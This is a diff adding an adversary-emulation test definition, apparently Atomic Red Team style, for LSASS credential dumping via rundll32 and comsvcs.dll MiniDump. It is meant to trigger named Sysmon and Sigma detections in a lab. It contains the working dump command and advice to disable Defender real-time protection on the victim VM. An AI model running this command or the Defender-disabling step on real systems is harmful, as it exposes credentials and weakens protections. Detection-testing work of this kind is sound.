@@ -1,0 +1,28 @@
+attack_technique: T1003.001
+display_name: 'OS Credential Dumping: LSASS Memory'
+atomic_tests:
+- name: DAC - LSASS MiniDump via comsvcs.dll
+  auto_generated_guid: af95c841-2f7c-4695-882e-ae6329b842c2
+  description: |
+    Same technique as the upstream test "Dump LSASS.exe Memory using comsvcs.dll".
+    rundll32 calls comsvcs.dll MiniDump on lsass.exe. Produces BOTH a Sysmon EID 1
+    (rundll32 command line) and an EID 10 (rundll32 opening lsass with 0x1fffff).
+    Triggers: proc_creation_win_rundll32_comsvcs_minidump and
+    proc_access_win_lsass_suspicious_access.
+    LAB ONLY: the dump contains real credential material of the lab VM. Microsoft Defender
+    blocks this by design - in the lab, disable real-time protection on the victim VM or
+    observe the block as a (separate) detection. The cleanup deletes the dump.
+  supported_platforms:
+  - windows
+  input_arguments:
+    dump_path:
+      description: Where to write the dump
+      type: path
+      default: $env:TEMP\dac-lsass.dmp
+  executor:
+    command: |
+      C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id "#{dump_path}" full
+    cleanup_command: |
+      Remove-Item "#{dump_path}" -Force -ErrorAction Ignore
+    name: powershell
+    elevation_required: true
